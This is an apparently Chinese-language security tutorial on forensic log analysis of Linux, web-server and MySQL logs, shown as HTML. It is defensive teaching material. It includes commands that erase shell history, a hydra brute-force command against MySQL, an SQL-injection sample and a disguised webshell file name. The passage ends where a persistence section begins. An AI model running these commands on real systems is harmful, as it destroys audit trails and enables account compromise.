/var/log/message &#35760;&#24405;&#31995;&#32479;&#37325;&#35201;&#20449;&#24687;&#30340;&#26085;&#24535;&#12290;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;&#20250;&#35760;&#24405;Linux&#31995;&#32479;&#30340;&#32477;&#22823;&#22810;&#25968;&#37325;&#35201;&#20449;&#24687;&#65292;&#22914;&#26524;&#31995;&#32479;&#20986;&#29616;&#38382;&#39064;&#26102;&#65292;&#39318;&#20808;&#35201;&#26816;&#26597;&#30340;&#23601;&#24212;&#35813;&#26159;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;

/var/log/btmp &#35760;&#24405;&#38169;&#35823;&#30331;&#24405;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#26597;&#30475;&#65292;&#32780;&#35201;&#20351;&#29992;lastb&#21629;&#20196;&#26597;&#30475;

/var/log/lastlog &#35760;&#24405;&#31995;&#32479;&#20013;&#25152;&#26377;&#29992;&#25143;&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#26102;&#38388;&#30340;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;lastlog&#21629;&#20196;&#26597;&#30475;

/var/log/wtmp &#27704;&#20037;&#35760;&#24405;&#25152;&#26377;&#29992;&#25143;&#30340;&#30331;&#24405;&#12289;&#27880;&#38144;&#20449;&#24687;&#65292;&#21516;&#26102;&#35760;&#24405;&#31995;&#32479;&#30340;&#21551;&#21160;&#12289;&#37325;&#21551;&#12289;&#20851;&#26426;&#20107;&#20214;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#20063;&#26159;&#19968;&#20010;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#38656;&#35201;&#20351;&#29992;last&#21629;&#20196;&#26469;&#26597;&#30475;

/var/log/utmp &#35760;&#24405;&#24403;&#21069;&#24050;&#32463;&#30331;&#24405;&#30340;&#29992;&#25143;&#20449;&#24687;&#65292;&#36825;&#20010;&#25991;&#20214;&#20250;&#38543;&#30528;&#29992;&#25143;&#30340;&#30331;&#24405;&#21644;&#27880;&#38144;&#19981;&#26029;&#21464;&#21270;&#65292;&#21482;&#35760;&#24405;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#30340;&#20449;&#24687;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;w&#65292;who&#65292;users&#31561;&#21629;&#20196;&#26469;&#26597;&#35810;

/var/log/secure &#35760;&#24405;&#39564;&#35777;&#21644;&#25480;&#26435;&#26041;&#38754;&#30340;&#20449;&#24687;&#65292;&#21482;&#35201;&#28041;&#21450;&#36134;&#21495;&#21644;&#23494;&#30721;&#30340;&#31243;&#24207;&#37117;&#20250;&#35760;&#24405;&#65292;&#27604;&#22914;SSH&#30331;&#24405;&#65292;su&#20999;&#25442;&#29992;&#25143;&#65292;sudo&#25480;&#26435;&#65292;&#29978;&#33267;&#28155;&#21152;&#29992;&#25143;&#21644;&#20462;&#25913;&#29992;&#25143;&#23494;&#30721;&#37117;&#20250;&#35760;&#24405;&#22312;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;
</pre>
</div>

<p>
比较重要的几个日志：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#30331;&#24405;&#22833;&#36133;&#35760;&#24405;&#65306;/var/log/btmp
&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#65306;/var/log/lastlog
&#30331;&#24405;&#25104;&#21151;&#35760;&#24405;: /var/log/wtmp
&#30331;&#24405;&#26085;&#24535;&#35760;&#24405;&#65306;/var/log/secure
&#30446;&#21069;&#30331;&#24405;&#29992;&#25143;&#20449;&#24687;&#65306;/var/run/utmp
&#21382;&#21490;&#21629;&#20196;&#35760;&#24405;&#65306;history
&#20165;&#28165;&#29702;&#24403;&#21069;&#29992;&#25143;&#30340;&#21382;&#21490;&#21629;&#20196;&#65306; history -c
</pre>
</div>
</div>
</div>
<div id="outline-container-h:e1cd4961-0b47-4a15-a250-0c8172c74a46" class="outline-4">
<h4 id="h:e1cd4961-0b47-4a15-a250-0c8172c74a46">日志分析技巧</h4>
<div class="outline-text-4" id="text-h:e1cd4961-0b47-4a15-a250-0c8172c74a46">
</div>
<div id="outline-container-h:64e781d4-dccd-4720-82ed-78a3723aa0f4" class="outline-5">
<h5 id="h:64e781d4-dccd-4720-82ed-78a3723aa0f4">常用的shell命令</h5>
<div class="outline-text-5" id="text-h:64e781d4-dccd-4720-82ed-78a3723aa0f4">
<p>
Linux下常用的shell命令如：find、grep 、egrep、awk、sed<br>
</p>

<p>
1、grep显示前后几行信息<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#26631;&#20934;unix/linux&#19979;&#30340;grep&#36890;&#36807;&#19979;&#38754;&#21442;&#25968;&#25511;&#21046;&#19978;&#19979;&#25991;&#65306;
grep -C 5 foo file &#26174;&#31034;file&#25991;&#20214;&#37324;&#21305;&#37197;foo&#23383;&#20018;&#37027;&#34892;&#20197;&#21450;&#19978;&#19979;5&#34892;
grep -B 5 foo file &#26174;&#31034;foo&#21450;&#21069;5&#34892;
grep -A 5 foo file &#26174;&#31034;foo&#21450;&#21518;5&#34892;
&#26597;&#30475;grep&#29256;&#26412;&#21495;&#30340;&#26041;&#27861;&#26159;&#65306;grep -V
</pre>
</div>

<p>
2、grep 查找含有某字符串的所有文件<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep -rn <span style="color: #8b2252;">"hello,world!"</span> *

* &#34920;&#31034;&#24403;&#21069;&#30446;&#24405;&#25152;&#26377;&#25991;&#20214;&#65292;&#20063;&#21487;&#20197;&#26159;&#26576;&#20010;&#25991;&#20214;&#21517;
-r &#26159;&#36882;&#24402;&#26597;&#25214;
-n &#26159;&#26174;&#31034;&#34892;&#21495;
-R &#26597;&#25214;&#25152;&#26377;&#25991;&#20214;&#21253;&#21547;&#23376;&#30446;&#24405;
-i &#24573;&#30053;&#22823;&#23567;&#20889;
</pre>
</div>

<p>
3、显示一个文件的某几行<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat input_file | tail -n +1000 | head -n 2000 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20174;&#31532;1000&#34892;&#24320;&#22987;&#65292;&#26174;&#31034;2000&#34892;&#12290;&#21363;&#26174;&#31034;1000~2999&#34892;</span>
</pre>
</div>

<p>
4、查找命令<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">find /etc -name init //&#22312;&#30446;&#24405;/etc&#20013;&#26597;&#25214;&#25991;&#20214;init
</pre>
</div>

<p>
5、只显示/etc/passwd的账户<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /etc/passwd | awk -F <span style="color: #8b2252;">':'</span> <span style="color: #8b2252;">'{print $1}'</span> //awk -F&#25351;&#23450;&#22495;&#20998;&#38548;&#31526;&#20026;<span style="color: #8b2252;">':'</span>&#65292;&#23558;&#35760;&#24405;&#25353;&#25351;&#23450;&#30340;&#22495;&#20998;&#38548;&#31526;&#21010;&#20998;&#22495;&#65292;&#22635;&#20805;&#22495;&#65292;$<span style="color: #a0522d;">0</span>&#21017;&#34920;&#31034;&#25152;&#26377;&#22495;,$<span style="color: #a0522d;">1</span>&#34920;&#31034;&#31532;&#19968;&#20010; &#22495;,$<span style="color: #a0522d;">n&#34920;&#31034;&#31532;n&#20010;&#22495;</span>&#12290;
</pre>
</div>

<p>
6、删除历史操作记录<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">sed -i <span style="color: #8b2252;">'153,$d'</span> .bash_history //&#21024;&#38500;&#21382;&#21490;&#25805;&#20316;&#35760;&#24405;&#65292;&#21482;&#20445;&#30041;&#21069;153&#34892;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c" class="outline-5">
<h5 id="h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c">日志分析技巧</h5>
<div class="outline-text-5" id="text-h:9b00aa5f-61f5-4eaa-bda8-7ed74b25805c">
<p>
1、/var/log/secure<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#23450;&#20301;&#26377;&#22810;&#23569;IP&#22312;&#29190;&#30772;&#20027;&#26426;&#30340;root&#36134;&#21495;&#65306;
grep <span style="color: #8b2252;">"Failed password for root"</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

2&#12289;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65306;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure | grep -E -o <span style="color: #8b2252;">"(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c

3&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#26159;&#20160;&#20040;&#65311;
grep <span style="color: #8b2252;">"Failed password"</span> /var/log/secure | perl -e <span style="color: #8b2252;">'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span> | uniq -c|sort -nr

4&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;IP&#26377;&#21738;&#20123;&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $11}'</span> | sort | uniq -c | sort -nr | more

5&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;&#26085;&#26399;&#12289;&#29992;&#25143;&#21517;&#12289;IP&#65306;
grep <span style="color: #8b2252;">"Accepted "</span> /var/log/secure | awk <span style="color: #8b2252;">'{print $1,$2,$3,$9,$11}'</span>
</pre>
</div>

<p>
2、/var/log/yum.log<br>
软件安装升级卸载日志：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[root@bogon ~]# more /var/log/yum.log
Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:0f71492b-b173-4475-8bdf-550a089b5a07" class="outline-3">
<h3 id="h:0f71492b-b173-4475-8bdf-550a089b5a07">Web日志分析</h3>
<div class="outline-text-3" id="text-h:0f71492b-b173-4475-8bdf-550a089b5a07">
<p>
Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。<br>
</p>

<p>
我们来看一条Apache的访问日志：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] <span style="color: #8b2252;">"GET /login.html HTTP/1.1"</span> 200 786 <span style="color: #8b2252;">"-"</span> <span style="color: #8b2252;">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"</span>
</pre>
</div>

<p>
通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、使用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。<br>
</p>
</div>
<div id="outline-container-h:7aa654f6-bc7f-4031-85a5-028c11571ea4" class="outline-4">
<h4 id="h:7aa654f6-bc7f-4031-85a5-028c11571ea4">日志分析技巧</h4>
<div class="outline-text-4" id="text-h:7aa654f6-bc7f-4031-85a5-028c11571ea4">
<p>
在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。<br>
</p>

<p>
1、确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。<br>
举例：SQL注入攻击，在web日志能看到什么？<br>
GET方法：在web日志中，通过接口地址我就可以看到注入的payload，比如1‘ and 1=1 #<br>
POST方法：通过大量的访问记录，找到攻击的接口地址，根据响应码判断是否攻击成功，以及确认该接<br>
口是否与数据库产生交互。<br>
</p>

<p>
2、攻击者在入侵网站后，通常会留下后门维持权限，以便再次访问，我们可以找到该文件，并以此为线索来展开分析。<br>
</p>

<p>
后门怎么来的？ &#x2013;&gt; 查看web日志，根据后门文件的创建时间去查看前后的日志 &#x2013;&gt; 看看系统登陆日志<br>
</p>

<p>
常用分析工具：<br>
</p>
<ul class="org-ul">
<li>Window下，推荐用 EmEditor/Notepad++ 进行日志分析，支持大文本，搜索效率不错。<br></li>
<li>Linux下，使用Shell命令组合查询分析。一般结合grep、awk等命令等实现常用的日志分析统计技巧。<br></li>
</ul>

<p>
Apache日志分析技巧：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#21015;&#20986;&#24403;&#22825;&#35775;&#38382;&#27425;&#25968;&#26368;&#22810;&#30340;IP&#21629;&#20196;&#65306;
cut -d- -f 1 log_file|uniq -c | sort -rn | head -20

2&#12289;&#26597;&#30475;&#24403;&#22825;&#26377;&#22810;&#23569;&#20010;IP&#35775;&#38382;&#65306;
awk <span style="color: #8b2252;">'{print $1}'</span> log_file|sort | uniq | wc -l

3&#12289;&#26597;&#30475;&#26576;&#19968;&#20010;&#39029;&#38754;&#34987;&#35775;&#38382;&#30340;&#27425;&#25968;&#65306;
grep <span style="color: #8b2252;">"/index.php"</span> log_file | wc -l

4&#12289;&#26597;&#30475;&#27599;&#19968;&#20010;IP&#35775;&#38382;&#20102;&#22810;&#23569;&#20010;&#39029;&#38754;&#65306;
awk <span style="color: #8b2252;">'{++S[$1]} END {for (a in S) print a,S[a]}'</span> log_file

5&#12289;&#23558;&#27599;&#20010;IP&#35775;&#38382;&#30340;&#39029;&#38754;&#25968;&#36827;&#34892;&#20174;&#23567;&#21040;&#22823;&#25490;&#24207;&#65306;
awk <span style="color: #8b2252;">'{++S[$1]} END {for (a in S) print S[a],a}'</span> log_file | sort -n

6&#12289;&#26597;&#30475;&#26576;&#19968;&#20010;IP&#35775;&#38382;&#20102;&#21738;&#20123;&#39029;&#38754;&#65306;
grep ^IP log_file| awk <span style="color: #8b2252;">'{print $1,$7}'</span>

7&#12289;&#21435;&#25481;&#25628;&#32034;&#24341;&#25806;&#32479;&#35745;&#24403;&#22825;&#30340;&#39029;&#38754;&#65306;
awk <span style="color: #8b2252;">'{print $12,$1}'</span> log_file | grep ^<span style="color: #8b2252;">\"</span>Mozilla | awk <span style="color: #8b2252;">'{print $2}'</span> | sort | uniq | wc -l

8&#12289;&#26597;&#30475;2022&#24180;6&#26376;21&#26085;14&#26102;&#36825;&#19968;&#20010;&#23567;&#26102;&#20869;&#26377;&#22810;&#23569;IP&#35775;&#38382;:
awk <span style="color: #8b2252;">'{print $4,$1}'</span> log_file | grep 21/Jun/2022:14 | awk <span style="color: #8b2252;">'{print $2}'</span>| sort | uniq | wc -l
</pre>
</div>
</div>
</div>
<div id="outline-container-h:af9f46d6-c15d-465d-a977-14dfbc86d5db" class="outline-4">
<h4 id="h:af9f46d6-c15d-465d-a977-14dfbc86d5db">日志分析案例</h4>
<div class="outline-text-4" id="text-h:af9f46d6-c15d-465d-a977-14dfbc86d5db">
<p>
实例：通过nginx代理转发到某内网服务器，内网服务器某站点目录下被上传了多个图片木马，虽然IIS下不能解析，但还是想找出谁通过什么路径上传的。<br>
</p>

<p>
在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的IP（即nginx），并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？<br>
</p>

<p>
这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。<br>
</p>

<p>
1、定位攻击源<br>
首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。<br>
</p>

<p>
shell.asp;.jpg<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">more u_ex180408.log | grep <span style="color: #8b2252;">"asp;."</span>

... /up/dj/2012.asp;.jgp  ...
</pre>
</div>


<figure id="orgd15b9ec">
<img src="./images/img_20230814_170554.png" alt="img_20230814_170554.png" width="60%"><br>

</figure>

<p>
浏览器指纹：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Mozilla/4.0+ (compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.N ET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)
</pre>
</div>

<p>
2、搜索相关日志记录<br>
通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。<br>
</p>


<figure id="org3499070">
<img src="./images/img_20230814_170909.png" alt="img_20230814_170909.png" width="60%"><br>

</figure>

<p>
3、对找到的访问日志进行解读，攻击者大致的访问路径如下<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">A&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;&#39318;&#39029;&#21644;&#30331;&#24405;&#39029;
B&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;MsgSjlb.aspx&#21644;MsgSend.aspx
C&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;Xzuser.aspx
D&#12289;&#25915;&#20987;&#32773;&#22810;&#27425;POST&#65288;&#24576;&#30097;&#36890;&#36807;&#36825;&#20010;&#39029;&#38754;&#19978;&#20256;&#27169;&#22359;&#32570;&#38519;&#65289;
E&#12289;&#25915;&#20987;&#32773;&#35775;&#38382;&#20102;&#22270;&#29255;&#26408;&#39532;
</pre>
</div>

<p>
打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。<br>
</p>
</div>
</div>
<div id="outline-container-h:b5aaf9c0-eef5-400d-837b-f89c6bec5802" class="outline-4">
<h4 id="h:b5aaf9c0-eef5-400d-837b-f89c6bec5802">日志统计分析技巧</h4>
<div class="outline-text-4" id="text-h:b5aaf9c0-eef5-400d-837b-f89c6bec5802">
<p>
统计爬虫：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep -E <span style="color: #8b2252;">'Googlebot|Baiduspider'</span> /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{ print $1 }'</span> | sort | uniq
</pre>
</div>

<p>
统计浏览器：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | grep -v -E <span style="color: #8b2252;">'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon'</span> | sort | uniq -c | sort -r -n | head -n 100
</pre>
</div>

<p>
IP 统计：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep <span style="color: #8b2252;">'23/May/2019'</span> /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $1}'</span> | awk -F<span style="color: #8b2252;">'.'</span> <span style="color: #8b2252;">'{print $1"."$2"."$3"."$4}'</span> | sort | uniq -c | sort -r -n | head -n 3
    2206 219.136.134.13
    1497 182.34.15.248
    1431 211.140.143.100 
</pre>
</div>

<p>
统计网段：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $1}'</span> | awk -F<span style="color: #8b2252;">'.'</span> <span style="color: #8b2252;">'{print $1"."$2"."$3".0"}'</span> | sort | uniq -c | sort -r -n | head -n 200
</pre>
</div>

<p>
统计域名：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $2}'</span> | sort | uniq -c | sort - rn | more
</pre>
</div>

<p>
HTTP Status：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $9}'</span> | sort | uniq -c | sort - rn | more
    5056585 304
    1125579 200
    7602 400
    5 301
</pre>
</div>

<p>
URL统计：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $7}'</span> | sort | uniq -c | sort - rn | more
</pre>
</div>

<p>
文件流量统计：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span> | sort -rn | more

grep <span style="color: #8b2252;">' 200 '</span> /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span> | sort -rn | more
</pre>
</div>

<p>
URL访问量统计：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat /www/logs/access.2019-02-23.log | awk <span style="color: #8b2252;">'{print $7}'</span> | egrep <span style="color: #8b2252;">'\?|&amp;'</span> | sort | uniq -c | sort -rn | more
</pre>
</div>

<p>
脚本运行速度：查出运行速度最慢的脚本<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep -v 0$ /www/logs/access.2019-02-23.log | awk -F <span style="color: #8b2252;">'\" '</span> <span style="color: #8b2252;">'{print $4" " $1}'</span> web.log | awk <span style="color: #8b2252;">'{print $1" "$8}'</span> | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt
</pre>
</div>

<p>
IP，URL 抽取：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1" "$7}'</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:9401981a-7cf6-458a-b060-bfe7149ffbf3" class="outline-3">
<h3 id="h:9401981a-7cf6-458a-b060-bfe7149ffbf3">Mysql日志分析</h3>
<div class="outline-text-3" id="text-h:9401981a-7cf6-458a-b060-bfe7149ffbf3">
<p>
<b>使用环境：DVWA</b><br>
</p>

<p>
Mysql 中的 general_log 能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#26597;&#30475;log&#37197;&#32622;&#20449;&#24687;
show variables like <span style="color: #8b2252;">'%general%'</span>;

2&#12289;&#24320;&#21551;&#26085;&#24535;
SET GLOBAL <span style="color: #a0522d;">general_log</span> = <span style="color: #8b2252;">'On'</span>;

3&#12289;&#25351;&#23450;&#26085;&#24535;&#25991;&#20214;&#36335;&#24452;
<span style="color: #b22222;">#</span><span style="color: #b22222;">SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';</span>
</pre>
</div>

<p>
查看mysql日志文件：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">root@a2c8a6d15492:/# tail /var/log/mysql/mysql.log
                  246 Connect   root@localhost on dvwa
                  245 Quit      
                  246 Quit      
231013  1:34:38   247 Connect   root@localhost on 
                  247 Query     select @@version_comment limit 1
231013  1:34:41   247 Quit      
231013  1:35:07   248 Connect   root@localhost on 
                  248 Query     select @@version_comment limit 1
231013  1:35:34   248 Query     show variables like <span style="color: #8b2252;">'%log%'</span>
231013  1:35:48   248 Quit
</pre>
</div>


<figure id="orgf7ec00c">
<img src="./images/img_20230814_171916.png" alt="img_20230814_171916.png" width="60%"><br>

</figure>

<p>
按列来解析一下：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#31532;&#19968;&#21015;&#65306;Time
&#21069;&#38754;&#19968;&#20010;&#26159;&#26085;&#26399;&#65292;&#21518;&#38754;&#19968;&#20010;&#26159;&#23567;&#26102;&#21644;&#20998;&#38047;&#65292;&#26377;&#19968;&#20123;&#19981;&#26174;&#31034;&#30340;&#21407;&#22240;&#26159;&#22240;&#20026;&#36825;&#20123;sql&#35821;&#21477;&#20960;&#20046;&#26159;&#21516;&#26102;&#25191;&#34892;&#30340;&#65292;&#25152;&#20197; &#23601;&#19981;&#21478;&#22806;&#35760;&#24405;&#26102;&#38388;&#20102;&#12290;

&#31532;&#20108;&#21015;&#65306;ID
show processlist&#20986;&#26469;&#30340;&#31532;&#19968;&#21015;&#30340;&#32447;&#31243;ID&#65292;&#23545;&#20110;&#38271;&#36830;&#25509;&#21644;&#19968;&#20123;&#27604;&#36739;&#32791;&#26102;&#30340;sql&#35821;&#21477;&#65292;&#20320;&#21487;&#20197;&#31934;&#30830;&#25214;&#20986;&#31350;&#31455;&#26159; &#21738;&#19968;&#20010;&#32447;&#31243;&#22312;&#36816;&#34892;&#12290;

&#31532;&#19977;&#21015;&#65306;Command&#65292;&#25805;&#20316;&#31867;&#22411;
&#27604;&#22914;Connect&#23601;&#26159;&#36830;&#25509;&#25968;&#25454;&#24211;&#65292;Query&#23601;&#26159;&#26597;&#35810;&#25968;&#25454;&#24211;(&#22686;&#21024;&#26597;&#25913;&#37117;&#26174;&#31034;&#20026;&#26597;&#35810;)&#65292;&#21487;&#20197;&#29305;&#23450;&#36807;&#28388;&#19968;&#20123;&#25805;&#20316;&#12290;

&#31532;&#22235;&#21015;&#65306;Argument&#65292;&#35814;&#32454;&#20449;&#24687;
&#20363;&#22914; Connect root@localhost on &#24847;&#24605;&#23601;&#26159;&#36830;&#25509;&#25968;&#25454;&#24211;&#65292;&#20197;&#27492;&#31867;&#25512;&#65292;&#25509;&#19979;&#38754;&#30340;&#36830;&#19978;&#25968;&#25454;&#24211;&#20043;&#21518;&#65292;&#20570;&#20102;&#20160; &#20040;&#26597;&#35810;&#30340;&#25805;&#20316;&#12290;
</pre>
</div>
</div>
<div id="outline-container-h:f08aa3df-2ea7-4824-87d1-079af315485a" class="outline-4">
<h4 id="h:f08aa3df-2ea7-4824-87d1-079af315485a">Mysql暴力破解日志分析</h4>
<div class="outline-text-4" id="text-h:f08aa3df-2ea7-4824-87d1-079af315485a">
<ul class="org-ul">
<li>查看登录日志是否开启：show variables like '%general%';<br></li>
<li>发现登录日志关闭，日志文件位置为：C:\phpstudy_pro\Extensions\MySQL5.7.26\data\Win7-PC.log<br></li>
<li>开启登录日志：SET GLOBAL general_log='on';<br></li>
<li>利用hydra爆破Mysql，生成Win7-PC.log日志<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">hydra 192.168.75.131 mysql -l root -P pwd.txt -vV
</pre>
</div>

<p>
登录失败的记录：不管是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">80 Connect root@192.168.108.128 on using TCP/IP
80 Connect Access denied for user <span style="color: #8b2252;">'root'</span>@<span style="color: #8b2252;">'192.168.108.128'</span> (using password: YES)
</pre>
</div>

<p>
登录成功的记录：不同的爆破工具或者登录方式，显示出来的口令猜解成功的记录会有所差别。这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户连接数据库的方式。<br>
</p>

<p>
Navicat for MySQL登录：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">2022-11-06T13:49:03.648194Z 145 Connect root@LAPTOP-5NFOIJFJ on using TCP/IP
2022-11-06T13:49:03.648194Z 145 Query SET NAMES utf8mb4
2022-11-06T13:49:03.710594Z 145 Query SHOW VARIABLES LIKE <span style="color: #8b2252;">'lower_case_%'</span>;
2022-11-06T13:49:03.835394Z 145 Query SHOW VARIABLES LIKE <span style="color: #8b2252;">'sql_mode'</span>;
2022-11-06T13:49:03.882194Z 145 Query SELECT COUNT(*) AS support_ndb FROM information_schema.ENGINES WHERE <span style="color: #a0522d;">Engine</span> = <span style="color: #8b2252;">'ndbcluster'</span>
2022-11-06T13:49:03.897794Z 145 Query SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME FROM
</pre>
</div>

<p>
命令行登录：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">2022-11-06T13:49:03.648194Z 111 Connect root@localhost on 111 Query select @@version_comment limit 1
2022-11-06T13:49:03.710594Z 145 Quit
</pre>
</div>

<p>
还可以利用shell命令进行简单的分析：<br>
</p>

<p>
有哪些IP在爆破？<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep <span style="color: #8b2252;">"Access denied"</span> Win7-PC.log |cut -d <span style="color: #8b2252;">"'"</span> -f4 | uniq -c | sort -nr
  50 192.168.108.128
  20 LAPTOP-5NFOIJFJ
</pre>
</div>

<p>
发现192.168.108.128在爆破<br>
</p>

<p>
爆破的用户名字典是哪些？<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">grep <span style="color: #8b2252;">"Access denied"</span> Win7-PC.log |cut -d <span style="color: #8b2252;">"'"</span> -f2 | uniq -c | sort -nr
  70 root
</pre>
</div>

<p>
发现用户名字典为root。<br>
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-h:1aec45e7-2501-4277-b22a-20c41fa36fe1" class="outline-2">
<h2 id="h:1aec45e7-2501-4277-b22a-20c41fa36fe1">权限维持</h2>
<div class="outline-text-2" id="text-h:1aec45e7-2501-4277-b22a-20c41fa36fe1">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
